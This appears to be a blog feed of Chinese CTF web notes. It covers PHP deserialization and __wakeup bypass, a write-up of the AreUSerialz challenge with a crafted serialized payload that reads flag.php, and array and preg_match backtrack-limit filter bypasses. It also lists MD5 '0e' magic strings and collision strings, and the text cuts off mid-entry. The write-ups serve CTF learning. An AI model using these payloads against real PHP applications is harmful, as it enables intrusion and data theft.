&#x27;O:7:&quot;myClass&quot;:3:&#123;s:5:&quot;first&quot;;i:123;s:9:&quot;*second&quot;;s:3:&quot;456&quot;;s:14:&quot;myClassthird&quot;;s:3:&quot;789&quot;;&#125;&#x27;;<br>$obj = unserialize($str);<br></code></pre></div></td></tr></table></figure><h3 id="1-wakup-函数"><a href="#1-wakup-函数" class="headerlink" title="1. __wakup() 函数"></a>1. __wakup() 函数</h3><p>在调用 <code>unserialize()</code> 函数前执行</p><h3 id="2-反序列化漏洞"><a href="#2-反序列化漏洞" class="headerlink" title="2. 反序列化漏洞"></a>2. 反序列化漏洞</h3><p>当序列化字符串表示对象属性个数的值大于或小于（依据 PHP 版本而不同）真实个数的属性时就会跳过 <code>__wakeup()</code> 的执行</p><p>例如对于传入下面的序列化字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">O:7:&quot;myClass&quot;:3:&#123;s:5:&quot;first&quot;;i:123;s:9:&quot;*second&quot;;s:3:&quot;456&quot;;s:14:&quot;myClassthird&quot;;s:3:&quot;789&quot;;&#125;<br></code></pre></div></td></tr></table></figure><p>旧版本可更改 <code>O:7:&quot;myClass&quot;:3:</code> 为 <code>O:7:&quot;myClass&quot;:4:</code><br>新版本可更改 <code>O:7:&quot;myClass&quot;:3:</code> 为 <code>O:7:&quot;myClass&quot;:2:</code></p><p>实现绕过 <code>__wakeup()</code> 的执行</p><h2 id="题目1-网鼎杯-2020-青龙组-AreUSerialz1"><a href="#题目1-网鼎杯-2020-青龙组-AreUSerialz1" class="headerlink" title="题目1 [网鼎杯 2020 青龙组]AreUSerialz1"></a>题目1 [网鼎杯 2020 青龙组]AreUSerialz1</h2><p>buuoj.cn</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br><br>include(&quot;flag.php&quot;);<br><br>highlight_file(__FILE__);<br><br>class FileHandler &#123;<br><br>    protected $op;<br>    protected $filename;<br>    protected $content;<br><br>    function __construct() &#123;<br>        $op = &quot;1&quot;;<br>        $filename = &quot;/tmp/tmpfile&quot;;<br>        $content = &quot;Hello World!&quot;;<br>        $this-&gt;process();<br>    &#125;<br><br>    public function process() &#123;<br>        if($this-&gt;op == &quot;1&quot;) &#123;<br>            $this-&gt;write();<br>        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;<br>            $res = $this-&gt;read();<br>            $this-&gt;output($res);<br>        &#125; else &#123;<br>            $this-&gt;output(&quot;Bad Hacker!&quot;);<br>        &#125;<br>    &#125;<br><br>    private function write() &#123;<br>        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;<br>            if(strlen((string)$this-&gt;content) &gt; 100) &#123;<br>                $this-&gt;output(&quot;Too long!&quot;);<br>                die();<br>            &#125;<br>            $res = file_put_contents($this-&gt;filename, $this-&gt;content);<br>            if($res) $this-&gt;output(&quot;Successful!&quot;);<br>            else $this-&gt;output(&quot;Failed!&quot;);<br>        &#125; else &#123;<br>            $this-&gt;output(&quot;Failed!&quot;);<br>        &#125;<br>    &#125;<br><br>    private function read() &#123;<br>        $res = &quot;&quot;;<br>        if(isset($this-&gt;filename)) &#123;<br>            $res = file_get_contents($this-&gt;filename);<br>        &#125;<br>        return $res;<br>    &#125;<br><br>    private function output($s) &#123;<br>        echo &quot;[Result]: &lt;br&gt;&quot;;<br>        echo $s;<br>    &#125;<br><br>    function __destruct() &#123;<br>        if($this-&gt;op === &quot;2&quot;)<br>            $this-&gt;op = &quot;1&quot;;<br>        $this-&gt;content = &quot;&quot;;<br>        $this-&gt;process();<br>    &#125;<br><br>&#125;<br><br>function is_valid($s) &#123;<br>    for($i = 0; $i &lt; strlen($s); $i++)<br>        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))<br>            return false;<br>    return true;<br>&#125;<br><br>if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;<br><br>    $str = (string)$_GET[&#x27;str&#x27;];<br>    if(is_valid($str)) &#123;<br>        $obj = unserialize($str);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><h4 id="1-is-valid"><a href="#1-is-valid" class="headerlink" title="1. is_valid()"></a>1. is_valid()</h4><p>说明：<code>ord()</code> 将字符转化为 ASCII 码，要求我们传入的 str 的每个字符的 ASCII 值在 32 和 125 之间。因为 protected 属性在序列化之后会出现不可见字符 \00*\00 ，不符合上面的要求。</p><p>绕过方法：因为 PHP7.1 以上的版本对属性类型不敏感，所以可以将属性改为 public ，public 属性序列化不会出现不可见字符</p><h4 id="2-unserialize"><a href="#2-unserialize" class="headerlink" title="2. unserialize()"></a>2. unserialize()</h4><p>执行反序列化函数时不会调用 <code>__construct()</code> 方法，无视其中的内容</p><p>观察 <code>__deconstruct()</code> 方法，发现需要在调用 <code>process()</code> 方法时进入 <code>read()</code> 方法，读取 <code>flag.php</code> 文件，返回flag</p><p>为了进入 <code>read()</code> 方法，在 <code>process()</code> 中要使 <code>$this-&gt;op == &quot;2&quot;</code> ，而 <code>__deconstruct()</code> 中不能有 <code>$this-&gt;op === &quot;2&quot;</code> ，利用 PHP 的强弱类型比较不同，传入 <code>$this-&gt;op == 2</code> ，实现绕过</p><h4 id="3-构造-payload"><a href="#3-构造-payload" class="headerlink" title="3. 构造 payload"></a>3. 构造 payload</h4><p>注意 payload 中使用了 public 属性的 op 实现绕过 <code>is_valid()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:11:&quot;*filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;*content&quot;;s:0:&quot;&quot;;&#125;<br></code></pre></div></td></tr></table></figure><p>F12 观察 PHP 源码得到 flag</p><h2 id="Extra"><a href="#Extra" class="headerlink" title="Extra"></a>Extra</h2><p>参考资料</p><p><a href="https://blog.csdn.net/weixin_45844670/article/details/108171963">https://blog.csdn.net/weixin_45844670/article/details/108171963</a></p><p><a href="https://blog.csdn.net/weixin_45844670/article/details/108934194">https://blog.csdn.net/weixin_45844670/article/details/108934194</a></p><p><a href="https://www.php.cn/php-weizijiaocheng-427052.html">https://www.php.cn/php-weizijiaocheng-427052.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>源码泄露</title>
    <link href="/2021/11/08/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    <url>/2021/11/08/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/Lmg66/p/13598803.html">https://www.cnblogs.com/Lmg66/p/13598803.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>传参过滤绕过</title>
    <link href="/2021/10/31/%E4%BC%A0%E5%8F%82%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/"/>
    <url>/2021/10/31/%E4%BC%A0%E5%8F%82%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h2><p><code>ereg()</code> 函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回 true ，否则返回 false 。搜索字母的字符是大小写敏感的。</p><h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h2><p><code>strpos()</code> 函数查找字符串在另一字符串中第一次出现的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br>if (isset ($_GET[&#x27;nctf&#x27;])) &#123;<br>        if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;nctf&#x27;]) === FALSE)<br>            echo &#x27;必须输入数字才行&#x27;;<br>        else if (strpos ($_GET[&#x27;nctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE)   <br>            die(&#x27;Flag: &#x27;.$flag);<br>        else<br>            echo &#x27;骚年，继续努力吧啊~&#x27;;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>参数 ctf 要输入数字，同时又要输入<code>#biubiubiu</code></p><p>但是两个函数都可以用数组进行绕过</p><h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br>$aaa=$_GET[&#x27;aaa&#x27;];<br>if(!preg_match(&#x27;/http|https/i&#x27;, $aaa))&#123;<br>//somecode<br>&#125;<br>//传入 aaa[]=http<br></code></pre></div></td></tr></table></figure><p>利用<code>preg_match()</code>函数无法匹配数组，传入数组时返回 false ，绕过 if 判断</p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br>$aaa=$_GET[&#x27;aaa&#x27;];<br>if(!is_array($aaa) &amp;&amp; (!preg_match(&#x27;/http|https/i&#x27;, $aaa)))&#123;<br>//somecode<br>&#125;<br></code></pre></div></td></tr></table></figure><p>设置了验证提交的变量是否为数组，无法使用数组绕过</p><p>如果目标主机的 PHP 启用了 pcre 扩展，尝试利用 pcre 扩展中的设置项绕过</p><table><thead><tr><th>PCRE (Perl Compatible Regular Expressions) Support</th><th>enabled</th></tr></thead><tbody><tr><td>something else</td><td>content</td></tr></tbody></table><table><thead><tr><th align="center">Directive</th><th align="center">Local Value</th><th align="center">Master Value</th></tr></thead><tbody><tr><td align="center">pcre.backtrack_limit</td><td align="center">1000000</td><td align="center">1000000</td></tr><tr><td align="center">pcre.recursion_limit</td><td align="center">100000</td><td align="center">100000</td></tr></tbody></table><p>默认的回溯上限为 1000000 ，当输入的字符串超过该上限时，<code>preg_match()</code> 函数会出错，返回 false</p><p>构造 payload</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>somedata = &#123;<span class="hljs-string">&quot;aaa&quot;</span>:<span class="hljs-string">&quot;http&quot;</span>+<span class="hljs-string">&quot;iwantflag&quot;</span>*<span class="hljs-number">1000000</span>&#125;<br>res = requests.get(<span class="hljs-string">&#x27;&#x27;</span>,data=somedata,allow_redirects=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span> res.content<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>弱类型绕过与哈希碰撞</title>
    <link href="/2021/10/31/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87%E4%B8%8E%E5%93%88%E5%B8%8C%E7%A2%B0%E6%92%9E_md5_sha_json/"/>
    <url>/2021/10/31/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87%E4%B8%8E%E5%93%88%E5%B8%8C%E7%A2%B0%E6%92%9E_md5_sha_json/</url>
    
    <content type="html"><![CDATA[<h1 id="1-哈希"><a href="#1-哈希" class="headerlink" title="1. 哈希"></a>1. 哈希</h1><h2 id="1-弱类型比较-x3D-x3D"><a href="#1-弱类型比较-x3D-x3D" class="headerlink" title="(1). 弱类型比较 &#x3D;&#x3D;"></a>(1). 弱类型比较 &#x3D;&#x3D;</h2><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br>if(($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;])&amp;&amp;(md5($_GET[&#x27;a&#x27;])) == md5($_GET[&#x27;b&#x27;]))&#123;<br>    echo &quot;congratulations&quot;;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以利用 PHP 弱类型比较产生的漏洞</p><p>想要满足第二个判断只需要构造出 MD5 值为 0e 开头的字符串，这样的话弱类型比较会认为是科学计数法，0 的多少次方都是 0 ，因此可以绕过</p><p>一次 MD5 后 0e 开头的字符串</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">240610708<br>QNKCDZO<br>s878926199a<br>s155964671a<br>s214587387a<br>s1091221200a<br>s1184209335a<br>s1502113478a<br>s1665632922a<br>s1836677006a<br>s1885207154a<br></code></pre></div></td></tr></table></figure><p>一次和两次 MD5 后都是 0e 开头的字符串</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">CbDLytmyGm2xQyaLNhWn<br>770hQgrBOjrcqftrlaZk<br>7r4lGXCH2Ksu2JNT3BYM<br></code></pre></div></td></tr></table></figure><h2 id="2-强类型比较-x3D-x3D-x3D"><a href="#2-强类型比较-x3D-x3D-x3D" class="headerlink" title="(2). 强类型比较 &#x3D;&#x3D;&#x3D;"></a>(2). 强类型比较 &#x3D;&#x3D;&#x3D;</h2><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br>if(($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;])&amp;&amp;(md5($_GET[&#x27;a&#x27;])) === md5($_GET[&#x27;b&#x27;]))&#123;<br>    echo &quot;congratulations&quot;;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="a-使用数组比较"><a href="#a-使用数组比较" class="headerlink" title="(a). 使用数组比较"></a>(a). 使用数组比较</h3><p>在 PHP 中的 hash 函数 MD5 、sha1 等处理中若传入一个数组的值，则会报错返回 NULL ，而返回的值在类型和内容上都是相同的，所以可以用来绕过某些两边参数可控的场景，如果只能控制一边的值传入，则数组类型不适用</p><p>传入 a[]&#x3D;a, b[]&#x3D;b</p><p>满足 a 和 b 不相等，MD5 后又相等的条件，虽然报错，但能够获得输出。</p><h3 id="b-硬碰撞"><a href="#b-硬碰撞" class="headerlink" title="(b). 硬碰撞"></a>(b). 硬碰撞</h3><p>可以使用 fastcoll 生成 MD5 值相同的不同字符串</p><p>下面给出 a ，b ，c 三个不同的字符串有相同 MD5 值</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">a=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%df%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%<span class="hljs-number">73</span>%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%<span class="hljs-number">69</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">93</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">1</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%b9%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br>&amp;b=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span 